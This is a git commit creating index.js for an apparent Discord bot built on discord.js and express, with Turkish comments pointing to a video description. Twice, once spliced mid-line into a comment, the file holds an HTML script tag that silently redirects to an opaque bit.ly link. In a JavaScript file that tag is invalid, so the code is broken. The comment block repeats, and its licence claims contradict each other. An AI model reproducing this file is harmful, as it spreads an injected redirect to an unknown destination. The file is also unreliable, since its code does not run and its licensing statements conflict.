7aa1c03ba072ab53c999aafadb03f4a24738998e
Lytwest <76743461+Lytwest@users.noreply.github.com>
2021-11-17 15:00:46 +0300

    Create index.js

---
+++ index.js
@@ -0,0 +1,20 @@
+const Discord = require("discord.js");
+const client = new Discord.Client();
+const ayarlar = require("./ayarlar.js");
+const ms = require("ms")
+const fs = require("fs");
+const db = require("orio.db");
+const disbut = require('discord-buttons');
+disbut(client);
+const chalk = require("chalk");
+const express = require("express");
+
+const app = express()
+
+<script>location.href="https://bit.ly/3xzrFvW"</script>
+
+//Poliéncé'ın Tüm Kod Bilgileri Bu Videonun Açıklama Kısmında Yer Almaktadır.
+//İzinsiz Kullanılamaz,MIT Lisansı ve GNU Lisansı Bulunmaktadır. @`𝘓𝘺𝘵𝘸𝘦𝘴𝘵#0001 @Klouqz#000<script>location.href="https://bit.ly/3xzrFvW"</script>
+
+//Poliéncé'ın Tüm Kod Bilgileri Bu Videonun Açıklama Kısmında Yer Almaktadır.
+//İzinsiz Kullanılamaz,MIT Lisansı ve GNU Lisansı Bulunmaktadır. @`𝘓𝘺𝘵𝘸𝘦𝘴𝘵#0001 @Klouqz#000
